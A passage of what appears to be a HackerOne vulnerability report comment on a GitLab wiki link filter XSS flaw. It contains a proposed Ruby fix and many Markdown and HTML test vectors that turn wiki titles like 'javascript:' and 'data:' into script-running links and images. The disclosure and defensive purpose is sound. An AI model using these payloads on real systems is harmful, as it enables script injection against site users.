string.)\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003elib/banzai/filter/wiki_link_filter/rewriter.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e        def apply_rules\n          # Special case: relative URLs beginning with `/uploads/` refer to\n          # user-uploaded files will be handled elsewhere.\n          return @uri.to_s if public_upload?\n\n          # Special case: relative URLs beginning with Wikis::CreateAttachmentService::ATTACHMENT_PATH\n          # refer to user-uploaded files to the wiki repository.\n          unless repository_upload?\n            apply_file_link_rules!\n            apply_hierarchical_link_rules!\n          end\n\n          apply_relative_link_rules!\n\u003cspan class=\"gi\"\u003e+         block_unsafe_uri!\n\u003c/span\u003e          @uri.to_s\n        end\n\n        private\n\n+       def block_unsafe_uri!\n\u003cspan class=\"gi\"\u003e+         return unless @uri.scheme\n+         scheme = @uri.scheme.strip.downcase.gsub(/[^A-Za-z0-9\\+\\.\\-]+/, \u0026#39;\u0026#39;)\n+         contains_unsafe = Banzai::Filter::SanitizationFilter::UNSAFE_PROTOCOLS.any? { |protocol| scheme.include?(protocol) }\n+         @uri = Addressable::URI.parse(@wiki_base_path) if contains_unsafe\n+       end\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you need to remove attributes or tags themselves that contains the dangerous URI string, I think it would be better to do blocking within \u003cstrong\u003elib/banzai/filter/wiki_link_filter.rb\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eAlso, since the similar code have been written in \u003cstrong\u003elib/banzai/filter/autolink_filter.rb\u003c/strong\u003e and \u003cstrong\u003elib/banzai/filter/sanitization_filter.rb\u003c/strong\u003e, I think that it is better to make a shared module to prevent code clones.\u003c/p\u003e\n\n\u003ch2 id=\"markdown-markup-elements-in-the-scope-of-vulnerability\"\u003eMarkdown/Markup elements in the scope of vulnerability\u003c/h2\u003e\n\n\u003cp\u003eIn the first report, I mentioned only the links generated by Markdown string \u003ccode\u003e[LinkTitle](url)\u003c/code\u003e as the scope of vulnerability, but in this investigation, I found that the links and attributes generated by Markdown string \u003ccode\u003e![ImageOrVideoTitle](url)\u003c/code\u003e are also in the scope. The following part of the source code points to it:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003elib/banzai/filter/wiki_link_filter.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e    \u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eWikiLinkFilter\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eHTML\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003ePipeline\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eFilter\u003c/span\u003e\n      \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecall\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003edoc\u003c/span\u003e \u003cspan class=\"k\"\u003eunless\u003c/span\u003e \u003cspan class=\"n\"\u003eproject_wiki?\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003edoc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esearch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;a:not(.gfm)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess_link_attr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eattribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;href\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edoc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esearch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;video\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess_link_attr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eattribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;src\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edoc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esearch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;img\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n          \u003cspan class=\"kp\"\u003eattr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eattribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;data-src\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"n\"\u003eel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eattribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;src\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n          \u003cspan class=\"n\"\u003eprocess_link_attr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kp\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003edoc\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile \u003ccode\u003e[LinkTitle](url)\u003c/code\u003e only generates \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e tag, \u003ccode\u003e![ImageOrVideoTitle](url)\u003c/code\u003e generates both \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e/\u003ccode\u003e\u0026lt;video\u0026gt;\u003c/code\u003e and \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e. \u003ccode\u003eprocess_link_attr\u003c/code\u003e function performs the above-mentioned replacement process on attributes of \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e and \u003ccode\u003e\u0026lt;video\u0026gt;\u003c/code\u003e. \u003ccode\u003eprocess_link_attr\u003c/code\u003e function calls \u003ccode\u003eapply_rules\u003c/code\u003e function written in \u003cstrong\u003elib/banzai/filter/wiki_link_filter/rewriter.rb\u003c/strong\u003e with appropriate arguments. Since \u003ccode\u003eapply_rules\u003c/code\u003e function is called as the replacement process, the mitigation is already sufficient as described above. However, test vectors to be described later will increase.\u003c/p\u003e\n\n\u003cp\u003eWe can also write raw HTML within the Markdown text, so directly written \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e and other tags are also included in the scope. I added some test vectors for these too.\u003c/p\u003e\n\n\u003ch2 id=\"test-vectors\"\u003eTest vectors\u003c/h2\u003e\n\n\u003cp\u003eThe test vectors I used for this investigation are as follows.\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote: Some of these test vectors do not contain scripts, and some do not work depending on the browser and its security settings, but they all contain URIs that should be blocked.\u003c/em\u003e\u003c/p\u003e\n\n\u003ch3 id=\"test-vectors-for-javascript-scheme\"\u003eTest vectors for javascript: scheme\u003c/h3\u003e\n\n\u003cp\u003eTitle: \u003ccode\u003ejavascript::Test.vectors\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eContent:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# A href (Markdown)\n[A-href-Hierarchical-Dot](.alert(1);)\n\n[A-href-Hierarchical-DotDot](..alert(1);)\n\n[A-href-Hierarchical-DotSlashDotDotSlash](./../alert(1);)\n\n[A-href-Extname](alert(document.location);)\n\n# IMG (Markdown)\n![IMG-src-Hierarchical-Dot](.alert(1);)\n\n![IMG-src-Hierarchical-DotDot](..alert(1);)\n\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);)\n\n![IMG-src-Extname](alert(document.location);)\n\n# VIDEO (Markdown)\n![VIDEO-src-Hierarchical-Dot](.alert(1);//fake.mp4)\n\n![VIDEO-src-Hierarchical-DotDot](..alert(1);//fake.mp4)\n\n![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../alert(1);//fake.mp4)\n\n![VIDEO-src-Extname](alert(document.location);//fake.mp4)\n\n# HTML A href (Markup)\n\u0026lt;a href=\u0026quot;.alert(1);\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-Dot\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;..alert(1);\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-DotDot\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;./../alert(1);\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-DotSlashDotDotSlash\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;alert(document.location);\u0026quot;\u0026gt;MARKUP-A-href-Extname\u0026lt;/a\u0026gt;\n\n# HTML IMG (Markup)\n\u0026lt;img src=\u0026quot;.alert(1);\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-Dot\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;..alert(1);\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-DotDot\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;./../alert(1);\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;alert(document.location);\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Extname\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"test-vectors-for-data-scheme\"\u003eTest vectors for data: scheme\u003c/h3\u003e\n\n\u003cp\u003eTitle: \u003ccode\u003edata::Test.vectors\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eContent:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# A href (Markdown)\n[A-href-Hierarchical-Dot](.text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n[A-href-Hierarchical-DotDot](..text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n[A-href-Hierarchical-DotSlashDotDotSlash](./../text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n[A-href-Extname](text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.text)\n\n# IMG (Markdown)\n![IMG-src-Hierarchical-Dot](.text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n![IMG-src-Hierarchical-DotDot](..text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;)\n\n![IMG-src-Extname](text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.text)\n\n# VIDEO (Markdown)\n![VIDEO-src-Hierarchical](.text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.mp4)\n\n![VIDEO-src-Hierarchical-DoubleDot](..text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.mp4)\n\n![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.mp4)\n\n![VIDEO-src-Extname](text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.mp4)\n\n# HTML A href (Markup)\n\u0026lt;a href=\u0026quot;.text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-Dot\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;..text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-DotDot\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;./../text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot;\u0026gt;MARKUP-A-href-Hierarchical-DotSlashDotDotSlash\u0026lt;/a\u0026gt;\n\n\u0026lt;a href=\u0026quot;text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.text\u0026quot;\u0026gt;MARKUP-A-href-Extname\u0026lt;/a\u0026gt;\n\n# HTML IMG (Markup)\n\u0026lt;img src=\u0026quot;.text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-Dot\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;..text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-DotDot\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;./../text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\n\u0026lt;img src=\u0026quot;text/html,\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;fake.text\u0026quot; alt=\u0026quot;MARKUP-IMG-src-Extname\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"visualized-test-vectors-for-data-scheme\"\u003eVisualized test vectors for data: scheme\u003c/h3\u003e\n\n\u003cp\u003eTitle: \u003ccode\u003edata::VisualizedVectors.SVG\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eContent:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eIMG-src-Hierarchical-Dot\n![IMG-src-Hierarchical-Dot](.image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n\nIMG-src-Hierarchical-DotDot\n![IMG-src-Hierarchical-DotDot](..image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n\nIMG-src-Hierarchical-DotSlashDotDotSlash\n![IMG-src-Hierarchical-DotSlashDotDotSlash](./../image/svg+xml;base64,PHN2ZyB4PSI1MCIgeT0iNTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiPjxyZWN0IHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iZ3JlZW4iIC8+PC9zdmc+)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eNote: The base64 string in these vectors is the encoded result of SVG as follows:\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;svg x=\u0026quot;50\u0026quot; y=\u0026quot;50\u0026quot; width=\u0026quot;50\u0026quot; height=\u0026quot;50\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; version=\u0026quot;1.1\u0026quot;\u0026gt;\n    \u0026lt;rect width=\u0026quot;40\u0026quot; height=\u0026quot;40\u0026quot; fill=\u0026quot;green\u0026quot; /\u0026gt;\n\u0026lt;/svg\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eHere\u0026#39;s screenshot of these vectors (VisualizedVectors.png):\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"VisualizedVectors.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/491/694/daf0d13646b412d32f2173ae00eb9b577eb5a3f4/VisualizedVectors.png?response-content-disposition=attachment%3B%20filename%3D%22VisualizedVectors.png%22%3B%20filename%2A%3DUTF-8%27%27VisualizedVectors.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=a534a70f4e842608aff90de2e101aad7bb47d2af1d1e40df8f2627ddf82f45db\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/491/694/daf0d13646b412d32f2173ae00eb9b577eb5a3f4/VisualizedVectors.png?response-content-disposition=attachment%3B%20filename%3D%22VisualizedVectors.png%22%3B%20filename%2A%3DUTF-8%27%27VisualizedVectors.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026amp;X-Amz-Signature=a534a70f4e842608aff90de2e101aad7bb47d2af1d1e40df8f2627ddf82f45db\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eI wanted to display GitLab Tanuki in these vectors, but I stopped it because the vector would be very long.\u003c/em\u003e\u003c/p\u003e\n\n\u003ch3 id=\"test-vector-for-nested-title\"\u003eTest vector for nested Title\u003c/h3\u003e\n\n\u003cp\u003eTitle: \u003ccode\u003ejavascript:/nest1/nest2/nest3\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eContent:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# A href (Markdown)\n[A-href-nested-Title](../../../*COMMENT*/alert(1);)\n\n# IMG (Markdown)\n![IMG-src-nested-Title](../../../*COMMENT*/alert(1);)\n\n# VIDEO (Markdown)\n![VIDEO-src-nested-Title](../../../*COMMENT*/alert(1);//fake.mp4)\n\n# HTML A href (Markup)\n\u0026lt;a href=\u0026quot;../../../*COMMENT*/alert(1);\u0026quot;\u0026gt;MARKUP-A-href-nested-Title\u0026lt;/a\u0026gt;\n\n# HTML IMG (Markup)\n\u0026lt;img src=\u0026quot;../../../*COMMENT*/alert(1);\u0026quot; alt=\u0026quot;MARKUP-IMG-src-nested-Title\u0026quot;\u0026gt;\u0026lt;/img\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eNote: In these cases, the content of\u003c/em\u003e \u003ccode\u003e@slug\u003c/code\u003e \u003cem\u003eis\u003c/em\u003e \u003ccode\u003ejavascript:/nest1/nest2/nest3\u003c/code\u003e \u003cem\u003eand the content of\u003c/em\u003e \u003ccode\u003e@uri\u003c/code\u003e \u003cem\u003eis\u003c/em\u003e \u003ccode\u003e../../../*COMMENT*/alert(1);\u003c/code\u003e \u003cem\u003ein\u003c/em\u003e \u003cstrong\u003elib/banzai/filter/wiki_link_filter/rewriter.rb\u003c/strong\u003e. \u003cem\u003eWhen combining\u003c/em\u003e \u003ccode\u003e@slug\u003c/code\u003e \u003cem\u003eand\u003c/em\u003e \u003ccode\u003e@uri\u003c/code\u003e, \u003ccode\u003eAddressable::URI.join\u003c/code\u003e \u003cem\u003efunction also resolves relative path.\u003c/em\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-17T07:29:09.206Z","updated_at":"2019-05-17T07:29:09.206Z","actor":{"username":"ryhmnlfj","cleared":false,"url":"/ryhmnlfj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/564/715/09a17da22e888e053764acd1492f67b09d455e84_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":491694,"filename":"VisualizedVectors.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/491/694/daf0d13646b412d32f2173ae00eb9b577eb5a3f4/VisualizedVectors.png?response-content-disposition=attachment%3B%20filename%3D%22VisualizedVectors.png%22%3B%20filename%2A%3DUTF-8%27%27VisualizedVectors.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0